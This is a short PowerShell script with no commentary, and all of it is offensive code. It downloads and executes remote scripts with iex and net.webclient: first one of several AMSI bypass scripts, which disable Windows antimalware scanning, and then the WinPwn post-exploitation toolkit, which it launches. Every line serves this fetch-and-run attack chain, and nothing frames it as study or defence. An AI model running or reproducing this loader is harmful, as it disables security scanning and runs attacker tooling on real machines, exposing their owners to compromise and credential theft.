$string = iex (new-object net.webclient).downloadstring('https://raw.githubusercontent.com/SecureThisShit/Creds/master/obfuscatedps/amsicustom.ps1')
If (-Not $string)
{
  $string = iex (new-object net.webclient).downloadstring('https://raw.githubusercontent.com/SecureThisShit/Creds/master/obfuscatedps/amsi.ps1')
}
If (-Not $string)
{
  iex (new-object net.webclient).downloadstring('https://raw.githubusercontent.com/SecureThisShit/Creds/master/obfuscatedps/obfamsi.ps1')
  ShEEt
}
iex (new-object net.webclient).downloadstring('https://raw.githubusercontent.com/SecureThisShit/WinPwn/master/WinPwn.ps1')
WinPwn
